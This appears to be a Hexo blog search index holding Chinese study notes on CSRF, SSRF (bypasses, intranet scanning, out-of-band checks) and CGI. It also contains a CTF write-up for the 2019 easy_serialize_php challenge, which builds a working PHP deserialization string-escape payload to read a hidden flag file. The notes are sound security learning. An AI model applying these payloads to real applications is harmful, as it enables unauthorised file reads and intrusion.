<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CSRF跨站请求伪造</title>
    <url>/2022/04/22/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
    <content><![CDATA[<h1 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="CSRF跨站请求伪造"></a>CSRF跨站请求伪造</h1><p>原理：通过携带用户在其他页面的cookie值或其他特征 盗用用户身份 达到自己的目的</p>
<p><img src="https://s2.loli.net/2022/04/22/OzgRcBGUqe8Z7QT.png" alt="image-20220422190126603"></p>
<p><a href="https://www.jianshu.com/p/7f33f9c7997b">浅谈CSRF - 简书 (jianshu.com)</a></p>
<p>举个例子 </p>
<p>我在页面A 有一个可以修改password的功能 我在页面A的Cookie值没有过期的情况下 去打开了攻击者构造的页面B</p>
<p>如果页面A存在CSRF漏洞 那么此时用户的Cookie值可能就已经可以被携带了 并且攻击者在页面B恶意构造了修改password的内容 那么就会以用户的身份发起一个恶意的请求 达到修改password的目的</p>
<p>可以在burp中自动生成一段攻击代码 其实就是生成了一段将值隐藏起来 并且写死的表单 改表单可以向目标网页发送一个修改表单的请求</p>
<h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h3><p>为了防止CSRF漏洞的发生 网页A在进行一些敏感操作时可能会设定一串特殊的token值 来验证是否是可信任的用户</p>
<p>但这里要区分一下Cookie Session 和 Token  首先Cookie是储存在网页中的一段特征值 用来验证用户身份 而Session则是储存在服务端 而Token则是可以储存在任何位置的一段特征值 通过后端验证Token是否匹配 来进行身份验证</p>
<p>如果网页A对token的验证机制不完善 并且储存在了包文中 那么通过拦包的方式就可以拦截这串Token值 从而冒充了用户的身份</p>
]]></content>
      <categories>
        <category>分类1</category>
        <category>分类2</category>
      </categories>
      <tags>
        <tag>标签1</tag>
        <tag>标签2</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF</title>
    <url>/2022/04/16/SSRF/</url>
    <content><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h3 id="首先了解一个东西-内网和外网"><a href="#首先了解一个东西-内网和外网" class="headerlink" title="首先了解一个东西 内网和外网"></a>首先了解一个东西 内网和外网</h3><p>我们知道每一台计算机都有一个属于自己的ip 并且不只计算机 服务器（可以看作远程提供服务的计算机）也有自己的ip</p>
<p>世界上那么多的计算机 而ip地址却只有12位 应该是不够分配的 所以这里提出了内网与外网 外网也叫公网 广域网 内网也叫局域网</p>
<p>在企业，学校这种集体的地方会申请外网ip，也就是说该公司的唯一外网ip就是这个 在该外网ip下有很多的内网ip 也就是这个公司的员工的每一台计算机的ip</p>
<p>所以外网ip是唯一的 而内网ip在它对应的外网ip下是唯一的 内网ip对于所有的ip地址来说是不唯一的 这样就解决了ip地址分配不够的问题</p>
<p>并且内网的计算机在不连接到外网的情况下是不能上网的 我们家庭用的外网一般是营业厅的外网 内网ip则是由营业厅随机分配的 所以在互联网中进行交流依靠的都是公网 并且外网ip是可以被外界访问的 内网ip是不能直接被外界访问的</p>
<h3 id="SSRF-1"><a href="#SSRF-1" class="headerlink" title="SSRF"></a>SSRF</h3><p>那么什么是ssrf呢</p>
<p>刚才我们知道内网是不能直接从外界访问的 但是在某一内网ip所对应的公网内一定会有服务器来为该公网下的各内网计算机提供服务 也就是说服务器会对这些计算机发起各种各样的请求 如果我们能够将这些请求修改成我们自己的payload 就可以达成某些目的 所以ssrf叫做服务端请求伪造漏洞</p>
<p>ssrf可能出现的地方：</p>
<p>1.社交分享功能：获取超链接的标题等内容进行显示</p>
<p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p>
<p>3.在线翻译：给网址翻译对应网页的内容</p>
<p>4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p>
<p>5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p>
<p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p>
<p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p>
<p>8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</p>
<p>9.邮件系统：比如接收邮件服务器地址</p>
<p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p>
<p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p>
<p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p>
<p>12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p>
<h3 id="SSRF-内网信息搜集"><a href="#SSRF-内网信息搜集" class="headerlink" title="SSRF 内网信息搜集"></a>SSRF 内网信息搜集</h3><p>上面提到 SSRF 可以让我们通过服务端与内网相连 所以就可以利用该漏洞渗透进内网 进行信息搜集 SSRF也可以看作是一种注入攻击 相比于在数据库中进行处理的sql注入 以及通过注入js代码从而返回到前端的xss注入 ssrf一般会有一个可控的参数 而该参数一般是一个url 我们将这个参数替换成我们恶意构造的url就可以实现某些目的 比如内网的某个ip地址的433端口设置了一个可以删除用户名的api 那么如果将参数修改为url:433 并经过服务端的处理 那么就可以达到远程删除的效果 但是在实际中 由于ip地址数量很多 而且每个内网ip下又有很多端口 所以一般采用字典爆破的方式查看哪一个ip下的哪一个的端口是可以被我们利用的 从而达到内网信息搜集的目的 包括爆破一些端口 查看哪些端口是开放的 哪些是关闭的</p>
<h3 id="SSRF-Bypass（遇到新的会补充）"><a href="#SSRF-Bypass（遇到新的会补充）" class="headerlink" title="SSRF Bypass（遇到新的会补充）"></a>SSRF Bypass（遇到新的会补充）</h3><p>目前见到的防御方式：</p>
<p>1.urldecode（）需要将参数进行url编码或者二次编码</p>
<p>2.黑名单 白名单过滤</p>
<p>3.正则表达式</p>
<p>4.@绕过 比如 <a href="http://www.baidu.com@y1zh3e7.github.io/">http://www.baidu.com@y1zh3e7.github.io</a></p>
<p>这里会自动删除前面的<a href="http://www.baidu.com/">www.baidu.com</a> 只保留后面的y1zh3e7.github.io</p>
<h3 id="SSRF-OOB"><a href="#SSRF-OOB" class="headerlink" title="SSRF OOB"></a>SSRF OOB</h3><p>在各种需要get post传值 发包的漏洞中，我们一般观察网页回显来判断payload是否被执行 以及payload被执行的情况 如果网站管理员设置了无回显 那么要怎么判断payload是否被执行 之前在rce中也遇到过此类问题 可以采用oob带外通道回显的方式</p>
<p><a href="https://www.freebuf.com/articles/web/201013.html">带外通道技术（OOB）总结 - FreeBuf网络安全行业门户</a></p>
<p>这里需要注意的是 以前外带时需要去ceye注册 很麻烦 在1.6.15版本的burp后添加了 Collaborato 模块 可以直接在burp里进行带外 所以这件事告诉我们要及时更新手头的工具！！！！</p>
<p><a href="https://segmentfault.com/a/1190000021990948?sort=newest">Burp之Collaborator使用技巧 - SegmentFault 思否</a></p>
<p><a href="https://www.freebuf.com/news/193447.html">Burpsuite Collaborato模块详解 - FreeBuf网络安全行业门户</a></p>
]]></content>
      <categories>
        <category>网安</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>SSRF服务端请求伪造</tag>
      </tags>
  </entry>
  <entry>
    <title>easy_serialize_php</title>
    <url>/2022/04/13/easy-serialize-php/</url>
    <content><![CDATA[<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><p>==涉及函数：==</p>
<p><strong>implode</strong></p>
<p>返回由数组元素组合成的字符串。如果将第一个参数改成符号 则转化为字符串时各字符串间会使用改符号进行分割</p>
<p><img src="https://s2.loli.net/2022/04/09/anctzfKpeWIXrkM.png" alt="image-20220409150932265"></p>
<p><strong>preg_replace()</strong></p>
<p>执行一个正则表达式的搜索和替换 在第三个参数中搜索第一个参数替换为第二个参数</p>
<p><strong>extract()</strong></p>
<p>从数组中将变量导入到当前的符号表 这里有一个可利用的点 所以说当存在以下两种情况时 参数会覆盖原有的值</p>
<p>1.键值冲突</p>
<p>2.参数数组为敏感或非法字符/数字 比如php中的超全局变量</p>
<p><img src="https://s2.loli.net/2022/04/09/D34aJQEOjKPFdBi.png" alt="image-20220409202044021"></p>
<p><img src="https://s2.loli.net/2022/04/09/rGRsOgENcTpLFUM.png" alt="image-20220409202055738"></p>
<p>==代码审计==</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>可以看到在phpinfo()处 如果function==phpuinfo  就可以执行phpinfo 所以先从这里入手 搜集信息</p>
<p><img src="https://s2.loli.net/2022/04/09/tzkm4S2ELPqxyQA.png" alt="image-20220409155505102"></p>
<p>发现了可疑的flag路径 d0g3_f1ag.php 直接访问失败 </p>
<p>回到代码</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br></pre></td></tr></table></figure>



<p>刚才提到extract函数覆盖  举个例子</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/04/09/cNuUFRXpw7MYCHr.png" alt="image-20220409185719714"></p>
<p>可以看到在extract($_POST)后session中原有的两个数组被新post上去的数组所覆盖 </p>
<p>知道可以覆盖之后接着看源码</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现是不能直接给$_SESSION[‘img’]赋值 因为上面的代码在extract后执行 所以要用别的方法</p>
<p>这里要用到php反序列化的字符串逃逸 首先什么是字符串逃逸</p>
<p>1.字数增多</p>
<p>经正则替换后的字符串长度比原来未过滤的字符串长度长 </p>
<p>比如preg_match(“p”,”ww”,$string) </p>
<p>2.字数减少</p>
<p>经正则替换后的字符串长度比原来未过滤的字符串长度短 比如这道题  放个学习连接</p>
<p> <a href="https://xz.aliyun.com/t/9213">PHP反序列化 — 字符逃逸 - 先知社区 (aliyun.com)</a></p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析这几句代码 首先对我们post传入的东西进行变量覆盖 比如我现在如果传入了一个 _SESSION[flag]=1</p>
<p>那么现在超全局变量_SESSION 中所存在的两个值为 我们传入的_SESSION[flag] 和上面提到的_SESSION[img]</p>
<p>接着分析 又对SESSION超全局变量进行序列化 再进行过滤 这里就会造成一个问题</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;flagphp&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line">var_dump</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出结果 </p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;flagphp&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>再对上面的结果进行过滤</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现由于flagphp是正则表达式中需要过滤的字符 导致被替换为空 这里是第一个利用点</p>
<p>再看代码最后一行 可以通过控制_SESSION[img]的值从而控制读取的文件内容 这是第二个利用点</p>
<p>第一个点好像没有什么思路 先看第二个点 想要修改读取文件的内容 就 但是刚才提到过 不能直接给$_SESSION[‘img’]赋值 因为对该变量的赋值是在extract后执行的</p>
<p>所以想要改写就要在赋值之后进行 赋值后面可以利用的位置只有序列化 所以要在这里进行绕过</p>
<p>想直接把base64的值替换为目标flag地址的base64 但是这样是不可行的 可以看到上面由于过滤掉了关键字导致序列化的格式出现了问题 说好的7个字符已经不存在了 再进行反序列化就会报错 所以要重新构造payload既能修改键值又能成功反序列化</p>
<p>刚才的链接里提到了绕过方式 我就不多说了 用这道题举个例子   下面的phpflag会被过滤成空 看的时候自动转换成空白即可</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;phpflag&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>因为img是需要我们拿来使用的键 所以先从它入手 由于不能直接替换 所以要进行插入</p>
<p>将我们想要构造的img键插入到原来的img键的位置  新插入的base64是d0g3_f1ag.php</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;phpflag&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>在进行反序列化时 第一个}后面的东西就都被当成无效字符扔掉了 这样初步构造就完成了 接下来要做的就是修改格式 使它能成功反序列化</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">s:<span class="number">7</span>:<span class="string">&quot;phpflag&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>构造一下   </p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">s:<span class="number">7</span>:<span class="string">&quot;phpflag&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>构造后的第一个键 键名为 “;s:11: 长度为7 键值为字符”1” 长度为1 与另外一部分进行拼接</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;phpflag&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>这里我传入的SESSION变量是_SESSION[flagphp] 如果下标不同 序列化后要求的字数也不同 所以不同的下标构造出的payload也是不同的</p>
<p>这里一定有人问 如果phpflag被替换为空 格式不对啊 s7后面并不是七个字符 </p>
<p>但是别忘了我们的payload是要经过序列化的 也就是将</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">_<span class="variable">$SESSION</span>[phpflag]=;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>进行序列化 序列化后的结果是</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;phpflag&quot;</span>;s:<span class="number">87</span>:<span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>那么现在将phpflag替换成空之后格式是不是就对了呢 第一个键名为 “;s:87: 键值为 字符1</p>
<p>最后取出我们要传入的部分 </p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>传入payload</p>
<p>再次修改payload 将d0g3_f1ag.php的base64替换成/d0g3_fllllllag的base64 由于替换后长度依旧是20 所以不用修改其他部分</p>
]]></content>
      <categories>
        <category>网安</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>动态网页基础原理-CGI</title>
    <url>/2022/04/26/%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86-CGI/</url>
    <content><![CDATA[<h1 id="动态网页基础原理-CGI"><a href="#动态网页基础原理-CGI" class="headerlink" title="动态网页基础原理-CGI"></a>动态网页基础原理-CGI</h1><p>以下内容来源于 <a href="https://mp.weixin.qq.com/s/BHYQNDcXXXr7U04lWwQdrg">全面了解CGI、FastCGI、PHP-FPM (qq.com)</a> 想看原文请移步 下面是我自己的总结和扩充</p>
<h2 id="Web-Server传递数据的方法"><a href="#Web-Server传递数据的方法" class="headerlink" title="Web Server传递数据的方法"></a>Web Server传递数据的方法</h2><p>应该有不少人和我一样 在进行php开发时用的phpstudy来进行集成化的搭建环境 但是如果不用phpstudy那么在windows配置php开发环境时 应该经历这么几个步骤 </p>
<p>1.安装php 和 apach</p>
<p>2.在apache的配置文件（httpd.conf）添加并修改如下配置文件 这一步是为了让服务器能够解析php代码</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="comment">#添加下边两行</span></span><br><span class="line">LoadModule php5_module D:/php/php5apache2_2.dll</span><br><span class="line">AddType application/x-httpd-php .php</span><br><span class="line"><span class="comment"># 修改如下内容</span></span><br><span class="line">&lt;IfModule dir_module&gt;</span><br><span class="line">    DirectoryIndex index.php index.html</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>

<p>linux环境下</p>
<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">./configure --with-mysql=/usr/local --with-apache=/usr/local/apache --enable-track-vars</span><br></pre></td></tr></table></figure>

<p>原理都是用LoadModule加载php5_module 也就是把php作为apache的一个子模块来运行 当通过web访问php文件时 apache就会调用php5_module 来解析php代码</p>
<p>但是php5_module又是如何将数据传给php的解析器来解析php代码的呢 这里就用到了sapi</p>
<p>来看一下apache php和sapi之间的关系</p>
<p><img src="C:/Users/86132/AppData/Roaming/Typora/typora-user-images/image-20220426135529236.png" alt="image-20220426135529236"></p>
